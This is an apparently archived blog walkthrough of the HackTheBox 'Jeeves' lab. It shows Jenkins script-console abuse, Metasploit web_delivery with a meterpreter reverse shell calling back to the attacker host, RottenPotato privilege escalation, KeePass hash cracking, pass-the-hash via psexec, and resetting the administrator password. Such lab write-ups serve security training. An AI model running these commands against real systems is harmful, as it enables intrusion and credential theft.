@@ -1,0 +1,126 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box Challenge: Jeeves Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-jeeves-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-05-21T16:59:33+00:00">May 21, 2018</time><time class="updated" datetime="2025-07-05T18:06:34+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF Challenge “Jeeves”. This VM is also developed by Hack the Box, Jeeves is a Retired Lab and there are multiple ways to breach into this VM. In this lab, we have escalated root privilege in 3 different ways and for completing the challenge of this VM we took help from <span style="color: #3366ff;"><a style="color: #3366ff;" href="http://www.hackingarticles.in/hack-the-box-challenge-tally-walkthrough/">Tally</a></span> (Hack the box).</span></p>
+<p><span style="color: #000000;"><strong>Level: Medium</strong></span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> Find the user.txt and root.txt in the vulnerable Lab.</span></p>
+<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning </span></li>
+<li><span style="color: #000000;">Enumeration</span></li>
+<li><span style="color: #000000;">Exploiting Script Console Groovy</span></li>
+<li>Capture the user.txt</li>
+<li><span style="color: #000000;">Privilege Escalation</span></li>
+<li><span style="color: #000000;">Capture the root.txt Flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">As these labs are only available online, therefore, they have a static IP. Jeeves Lab has IP: 10.10.10.63.</span></p>
+<p><span style="color: #000000;">Now, as always let’s begin our hacking with the port enumeration.</span></p>
+<pre class="lang:default decode:true ">nmap -A 10.10.10.63</pre>
+<p><span style="color: #000000;">Looking around its result we have found that ports 22, 80, 135, 445 and 50000 are open, and moreover, port 135 and 445 were pointing towards Windows operating system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pjDaNMHwG9g/WwL3iGAP7sI/AAAAAAAAW-o/vgfGiALV5WIEvJ-7rzsLgcQIYb8cv772gCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Subsequently, first we checked web service and explored target IP in a web browser and it was put up by “Ask Jeeves search engine” webpage. So we tried to search some website such as google.com and a new web page represented by the fake error page come up in front of us.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_ar0jpKOigA/WwL3lx-Wl1I/AAAAAAAAW_M/i6CKfSGgdUsxWwcnIWIgxy8XVALgdg0pgCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;"> On browsing port 50000 in the Web browser give us to HTTP 404 Error page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XgaWehmJf8U/WwL3napAdLI/AAAAAAAAW_k/exnUOzYVhJ0ZimslFcvQPo8Zy8YlPWZqgCLcBGAs/s1600/3.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Then we decided to use OWASP Dirbuster for directory brute force attack.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-dR-PQSaLLug/WwL3nc8ThfI/AAAAAAAAW_o/GaycUkX18vUHYMJNaJCtJWQ0bQqNbSRJwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">From its result, we found so many directories but we drive with <strong>/askjeeves </strong>for further process.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ZE3Qjw2tPPE/WwL3nwUAU2I/AAAAAAAAW_s/DBR8jSlUiU0gSB0-OPMF11xIM1ZGPz3nwCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">So when we had explored <strong>10.10.10.63:50000/askjeeves</strong> it leads us to “Jenkins Dashboard”. Oh yes!! It was WOW time for us because we knew that there are so many ways to exploit Jenkins. So we move into the “Manage Jenkins” option because it was the spine and abuse was pretty soothing.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-tDOCRLA-RSw/WwL3oWw786I/AAAAAAAAW_w/64pPaOuW4CEhOGDLrdK9CND8ShkuxE8pwCLcBGAs/s1600/6.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting Jenkins</span></h3>
+<p><span style="color: #000000;">There were so many options, but we were interested in the<strong> Script Console</strong> because Jenkins has a very nice Groovy script console that allows someone to execute arbitrary Groovy scripts within the Jenkins master runtime.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-xdx4nSUW1wU/WwL3omHf4lI/AAAAAAAAW_0/eqCHPfVZjnkzI3KvAdMcyKa0EVoVTQ-GACLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">We have found that Java reverse shell from <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">GitHub</a>, so we copied the code and modified its local host and port according to our specifications.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vi3Z3-3ZIe8/WwL3o_VssYI/AAAAAAAAW_4/naR3Dk6t-wknX218nsJklAb-WPoRBtuTgCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Then we start Netcat listener and run over Groovy Script to access the reverse connection of the victim. From the image below, you can see that we have access to the tty shell of the victim’s machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UAGj-AFVgq4/WwL3pa9U23I/AAAAAAAAW_8/ZVT-xy8e0M4Dsp2kT46zQaVTrkDh-AS1ACLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">As we love the meterpreter shell, therefore, we load the Metasploit framework and execute commands below.</span></p>
+<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) &gt; set target 2
+msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.28
+msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.28
+msf exploit(multi/script/web_delivery) &gt; exploit</pre>
+<p><span style="color: #000000;"><strong>Copy </strong>the highlighted text for powershell.exe and <strong>Paste</strong> it inside CMD shell as shown in the next image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-jjjYsG-EWtc/WwL3iFmv4JI/AAAAAAAAW-k/xcnVDwyxI68o8Aoi-5vAtdi35UYtme_mQCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Paste malicious code here in netcat.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-7CRLD6ok1hM/WwL3iNlRM8I/AAAAAAAAW-g/vk-A-xEbiscm4tnGlnIwoWlLF_S98wI8gCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">You will receive a meterpreter session of the victim’s machine in your Metasploit framework and then finish the task by grabbing the user.txt and root.txt files:</span></p>
+<pre class="lang:default decode:true">getuid
+getprivs</pre>
+<p><span style="color: #000000;">But we don’t have currently NT AUTHORITY\SYSTEM permission, but we know the techniques we used in <span style="color: #3366ff;"><a style="color: #3366ff;" href="http://www.hackingarticles.in/hack-the-box-challenge-tally-walkthrough/">Tally</a></span> CTF to gain NT AUTHORITY\SYSTEM permission.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-NKqjOdGeRPc/WwL3jAnKH9I/AAAAAAAAW-s/tS0O6MVBKsQe6yRA56ezn3-6zkR00Z6VgCLcBGAs/s1600/12.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Therefore taking help from our previous article “<strong>Tally</strong>” we executed below commands and successfully gained NT AUTHORITY\SYSTEM permission</span></p>
+<pre class="lang:default decode:true">upload /root/Desktop/RottenPotato/rottenpotato.exe .
+load incognito
+execute -Hc -f rottenpotato.exe
+impersonate_token "NT AUTHORITY\SYSTEM"
+getuid</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-crIhy-IH1lE/WwL3jssTCrI/AAAAAAAAW-0/cS3nx_QHazcOf3TVhi2aOhKv1IzVtL2KACLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Let me tell you that we have solved so many of Hack the Box’s CTF challenges, some of which were framed using the Windows Operating System, and we have always grabbed the user.txt file from within a folder that is owned by any username and root.txt form in the Administrator folder, and both of these folders are present in C:\Users</span></p>
+<p><span style="color: #000000;">Similarly, you can also observe the same thing here and maybe you have my intention of the above words. So let’s first grab the <strong>user.txt</strong> file from inside <em>/kohsuke/Desktop</em>.</span></p>
+<p><span style="color: #000000;">COOL!!! We have captured the 1<sup>st</sup> flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cykYBlHmcJM/WwL3jnVC-aI/AAAAAAAAW-w/OOTpPydRockJHY-vhczO3zwZ1h-vwoYYwCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Then we go to the root.txt file, but it was a bit tricky to get the root.txt file. Because the author has a hidden root.txt file using some ADS technique( Windows Alternate Data Streams) and to grab that file, you can execute the following commands.</span></p>
+<pre class="lang:default decode:true">cd Administrator
+cd Desktop
+ls -al
+cat hm.txt
+dir /R
+more &lt; hm.txt:root.txt:$DATA</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-TQeWM87Hzok/WwL3kJXoSoI/AAAAAAAAW-4/LA3ysxc4zmckASRSJfh2IBtchhN8Zk-cgCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Hurray!! /R directory reveals root.txt file and we have successfully completed the second task.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-LhLzR3tyh2Q/WwL3kSTKgpI/AAAAAAAAW-8/p1oeL9LtN5Eo-ssO8EQIo1YEGJG9l8tFQCLcBGAs/s1600/16.png"/></span></p>
+<h3><span style="color: #800000;"><strong>2<sup>nd</sup> Method </strong></span></h3>
+<p><span style="color: #000000;">When you have fresh meterpreter session 1 then move into <strong>/document</strong> directory and download <strong>CEH.kdbx</strong> file. Here also we took help from our previous article TALLY.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qz1junREqXU/WwL3ko86kqI/AAAAAAAAW_A/QX_2W1sKkyYrptCevBj7IaUs9SVO-UmgACLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Now run the python script that extracts a HashCat/john crackable hash from KeePass 1.x/2.X databases.</span></p>
+<pre class="lang:default decode:true">python keepass2john.py CEH.kdbx &gt; passkey</pre>
+<p><span style="color: #000000;">Next, we used John the ripper to decrypt the contents of the “passkey,” using the following command.</span></p>
+<pre class="lang:default decode:true">john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt passkey</pre>
+<p><span style="color: #000000;">so we found the master-key “moonshine1” for keepass2 which is an application used for hiding passwords of your system, then you need to install it (keepass2) using the following command.</span></p>
+<pre class="lang:default decode:true">apt-get install keepass2 -y</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-v2IZ9kZkfUQ/WwL3k_GNt4I/AAAAAAAAW_E/4TWOlxVne4oXKiceCFZbU9otPP2NZ6pPwCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">After installing, run the below command and submit “moonshine1” in the field of the master key.</span></p>
+<pre class="lang:default decode:true">keepass2 tim.kdbx</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-F6Xa1_iLEFI/WwL3laIL2sI/AAAAAAAAW_I/DtmLi8gnW54x17gu11Dc5-PdL-juvR5rgCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Inside CEH we found so many credentials, we copied all passwords from here and paste inside a text file and got few passwords and one NTLM hash value: <strong>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-bTPQFDIjgTg/WwL3l6TaK1I/AAAAAAAAW_Q/Uu64jgvUXAwHofiPfGye5_pEW_vMvTApQCLcBGAs/s1600/20.png"/></span></p>
+<pre class="lang:default decode:true">use exploit/windows/smb/psexec
+msf exploit(windows/smb/psexec) &gt; set rhost 10.10.10.63
+msf exploit(windows/smb/psexec) &gt; set smbuser administrator
+msf exploit(windows/smb/psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+msf exploit(windows/smb/psexec) &gt; set lport 8888
+msf exploit(windows/smb/psexec) &gt; exploit</pre>
+<p><span style="color: #000000;">Awesome!!! We have meterpreter session 2 with proper NT AUTHORITY\SYSTEM permission, now use the above steps to get the root.txt file.</span></p>
+<p><span style="color: #000000;"><strong>Note:</strong> we have rebooted the target’s VM before starting the 2<sup>nd</sup> method.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xqWYAOuqbzE/WwL3mbVLijI/AAAAAAAAW_U/Fr-6lVGQI6A1hEcFu-WjBV4T9d1fFZaKgCLcBGAs/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">At the time when you have fresh meterpreter session 2 (via psexec) then execute the following command to enable remote desktop service in victim’s machine.</span></p>
+<pre class="lang:default decode:true">run getgui -e
+shell</pre>
+<p><span style="color: #000000;">Now we have the victim command prompt with administrator privilege, so we can change the user administrator password directly by using the net user command.</span></p>
+<pre class="lang:default decode:true">net user administrator 123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-LtoFLVsKfq4/WwL3mpKh-0I/AAAAAAAAW_Y/aC1kf0s3mXggHYRHtF0Z8IXCRSZflG5-wCLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Now open a new terminal in your Kali Linux and type <strong>rdesktop 10.10.10.63</strong> command to access remote desktop services of victim’s machine and after that submit credential <strong>administrator: 123 </strong>for login.</span></p>
+<p><span style="color: #000000;"><span style="color: #000000;">BOOOOOM!!! Look at the screen of our victim, now let’s grab the root flag and enjoy this GUI mode.</span></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-vWAONp7y9s8/WwL3mvM42tI/AAAAAAAAW_c/_tH_btxpDTAjwO6zgDA_yP0LGf7UcpEBgCLcBGAs/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">Finding user.txt is quite easy you can try on your own. To grab the root.txt flag open the CMD prompt and type following command ad done above.</span></p>
+<pre class="lang:default decode:true">dir /R
+more &lt; hm.txt:root.txt</pre>
+<p><span style="color: #000000;"><strong> </strong>Enjoy Hacking!!!!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--MovRwDU74w/WwL3nCBjbPI/AAAAAAAAW_g/RndlKx_y3mM14ghLaZ2nMPT1ibgUwz3dgCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking</span>!</p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
